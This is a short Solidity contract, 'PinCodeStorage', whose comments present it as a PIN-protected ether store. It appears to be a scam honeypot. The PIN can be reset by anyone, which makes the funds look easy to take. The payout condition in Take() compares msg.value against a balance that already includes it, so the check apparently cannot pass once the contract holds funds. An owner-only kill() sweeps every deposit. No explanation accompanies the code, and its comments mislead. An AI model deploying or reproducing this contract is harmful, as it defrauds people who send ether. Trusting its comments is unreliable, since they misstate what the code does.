1 contract PinCodeStorage {
2 	// Store some money with 4 digit pincode
3 	
4     address Owner = msg.sender;
5     uint PinCode;
6 
7     function() public payable {}
8     function PinCodeStorage() public payable {}
9    
10     function setPinCode(uint p) public payable{
11         //To set Pin you need to know the previous one and it has to be bigger than 1111
12         if (p>1111 || PinCode == p){
13             PinCode=p;
14         }
15     }
16     
17     function Take(uint n) public payable {
18 		if(msg.value >= this.balance && msg.value > 0.1 ether)
19 			// To prevent random guesses, you have to send some money
20 			// Random Guess = money lost
21 			if(n <= 9999 && n == PinCode)
22 				msg.sender.transfer(this.balance+msg.value);
23     }
24     
25     function kill() {
26         require(msg.sender==Owner);
27         selfdestruct(msg.sender);
28      }
29 }